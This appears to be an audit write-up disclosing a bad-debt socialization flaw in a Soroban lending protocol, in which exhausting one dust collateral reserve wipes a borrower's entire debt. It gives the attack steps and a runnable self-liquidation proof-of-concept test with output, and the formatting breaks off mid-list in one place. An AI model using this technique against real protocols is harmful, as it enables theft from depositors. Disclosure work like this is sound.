> **Disclosure Note:** This write-up is an educational abstraction based on a real-world audit finding. Specific vendor details, proprietary testing harnesses, and identifiable namespaces have been heavily redacted and abstracted into generic Soroban SDK mocks to strictly comply with confidentiality agreements. The core logic flaw and economic impact remain mathematically accurate.

# Architectural Flaw: Isolated Collateral Exhaustion Leads to Global Debt Erasure

**Author:** Ayoub Aragui (aragui99)
**Category:** State Deviation / Economic Invariant Breach
**Language:** Rust (Soroban SDK)

## Structural Reconnaissance
In multi-collateral lending architectures, bad debt socialization must strictly correlate with absolute global insolvency. The "Conservation of Value" invariant dictates that debt forgiveness can only occur if the user's *Total Collateral Base* across all supplied reserves is insufficient to cover the borrowed assets.

## The Logic Flaw (State Deviation)
A critical logic flaw exists in the liquidation engine's bad debt socialization mechanism. During a liquidation event, if the targeted asset to be seized exceeds the user's specific balance for that singular asset, the protocol sets a localized cap flag (e.g., `is_collateral_exhausted`).

The terminal vulnerability lies in the post-burn state mutation. The system erroneously assumes this localized flag represents global bankruptcy. It unconditionally socializes the remaining debt and wipes the user's entire debt balance:

```rust
if is_collateral_exhausted {
    storage::socialize_bad_debt(env, &debt_asset, remaining_debt);
    user_state.remaining_debt_balance = 0; // [!] CRITICAL: Unconditional wipe
}


This logic fails to verify the user's active configuration bitmap for other well-funded collateral reserves.
The Triple-Asset Bypass (Impact)
An attacker bypasses standard liquidation constraints using a three-reserve topology:
1.	Supply a massive volume of Asset A.
2.	Supply a "dust" volume of Asset C.
3.	Borrow heavily in Asset B against the massive Asset A collateral.
4.	Upon natural market volatility dropping the Health Factor below 1.0,

#[test]
fn test_aragui99_triple_asset_debt_wipeout() {
    use soroban_sdk::{Env, Symbol, IntoVal, vec};
    
    let env = Env::default();
    env.mock_all_auths(); 
    
    // [!] Generic Protocol Setup Omitted for Abstraction
    // Instantiating abstracted lending_pool and oracle mocks...
    let (lending_pool, oracle, user, liquidator, asset_a, asset_b, asset_c) = abstract_protocol_setup(&env);

    // 1. Supply Massive Asset A
    lending_pool.supply(&user, &asset_a, &10_000_000_000);
    
    // 2. Supply Dust Asset C
    lending_pool.supply(&user, &asset_c, &2_000);
    
    // 3. Borrow Heavily Asset B
    lending_pool.borrow(&user, &asset_b, &7_400_000_000);

    let initial_data = lending_pool.get_account_data(&user);
    std::println!("[*] aragui99 Audit - Init Debt: {} | Init HF: {}", initial_data.total_debt, initial_data.health_factor);

    // Market Volatility Simulation (Dropping HF < 1.0)
    oracle.mock_price_drop(&asset_a, 85_000_000_000_000);
    oracle.mock_price_pump(&asset_b, 115_000_000_000_000);

    std::println!("[*] aragui99 Audit - HF Post-Volatility: {}", lending_pool.get_account_data(&user).health_factor);

    // 4. Trigger Exploit: Self-Liquidate targeting the dust Asset C
    let res = env.try_invoke_contract::<(), soroban_sdk::Error>(
        &lending_pool.address,
        &Symbol::new(&env, "liquidate_position"),
        vec![
            &env,
            liquidator.into_val(&env),
            asset_c.into_val(&env), // Target dust collateral
            asset_b.into_val(&env), // Pay debt
            user.into_val(&env),    
            (1_000_000_000u128).into_val(&env),
        ],
    );

    let final_data = lending_pool.get_account_data(&user);
    std::println!("[*] aragui99 Audit - Remaining Collateral: {}", final_data.total_collateral);
    std::println!("[!] aragui99 Audit - Post-Liquidation Debt: {}", final_data.total_debt);

    assert!(res.is_ok(), "Liquidation failed");
    assert_eq!(final_data.total_debt, 0, "HARD ASSERTION FAILED: Debt not fully wiped");
    assert!(final_data.total_collateral > 0, "HARD ASSERTION FAILED: Collateral unjustly seized");
}

[*] aragui99 Audit - Init Debt: 740000000000000000000 | Init HF: 1148648878378378378
[*] aragui99 Audit - HF Post-Volatility: 849001374853113983
[*] aragui99 Audit - Remaining Collateral: 850000000000000000000
[!] aragui99 Audit - Post-Liquidation Debt: 0
test test_aragui99_triple_asset_debt_wipeout ... ok
